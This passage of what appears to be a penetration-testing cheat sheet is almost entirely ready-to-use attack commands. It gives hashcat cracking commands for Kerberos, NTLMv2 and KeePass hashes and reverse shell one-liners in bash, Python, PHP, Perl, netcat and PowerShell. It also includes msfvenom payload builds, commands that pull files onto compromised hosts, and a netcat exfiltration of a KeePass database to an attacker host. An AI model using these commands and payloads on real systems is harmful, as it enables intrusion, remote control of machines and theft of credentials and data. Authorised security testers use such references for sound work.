| Net-NTLMv2 | 5600 | `hashcat -m 5600 hash.txt rockyou.txt` |
| Kerberoast (TGS-REP) | 13100 | `hashcat -m 13100 hash.txt rockyou.txt` |
| AS-REP | 18200 | `hashcat -m 18200 hash.txt rockyou.txt` |
| KeePass | 13400 | `hashcat -m 13400 hash.txt rockyou.txt` |
| SSH Key | 22921 | `hashcat -m 22921 hash.txt rockyou.txt` |
| md5crypt | 500 | `hashcat -m 500 hash.txt rockyou.txt` |
| sha512crypt | 1800 | `hashcat -m 1800 hash.txt rockyou.txt` |
| bcrypt | 3200 | `hashcat -m 3200 hash.txt rockyou.txt` |

### Reverse Shells Quick Reference

```bash
# Bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
bash -c "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Netcat (traditional)
nc -e /bin/sh $LHOST $LPORT

# Netcat (no -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f

# PowerShell (one-liner)
powershell -c "$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)};$c.Close()"

# msfvenom payloads
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shell.jsp
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php
```

### File Transfer Cheat Sheet

#### To Linux Target

```bash
# Python HTTP
python3 -m http.server 1337  # on attacker
wget http://$LHOST:1337/file  # on target
curl http://$LHOST:1337/file -o file

# Netcat
nc -lvnp 4444 > file         # on target
nc $IP 4444 < file        # on attacker
```

#### To Windows Target

```powershell
# PowerShell
iwr -uri http://$LHOST:1337/file.exe -Outfile file.exe
(New-Object Net.WebClient).DownloadFile("http://$LHOST:1337/file.exe","C:\TEMP\file.exe")

# certutil
certutil -urlcache -split -f "http://$LHOST:1337/file.exe" file.exe

# SMB (from attacker: impacket-smbserver smbfolder $(pwd) -smb2support -user kali -password kali)
$pass = ConvertTo-SecureString 'kali' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('kali', $pass)
New-PSDrive -Name kali -PSProvider FileSystem -Credential $cred -Root \\LHOST\smbfolder
copy kali:\file.exe C:\TEMP\
```

#### From Windows Target (exfil)

```powershell
# Netcat
Get-Content "file.kdbx" | .\nc.exe $LHOST 5555
# On attacker: nc -lvnp 5555 > file.kdbx
```
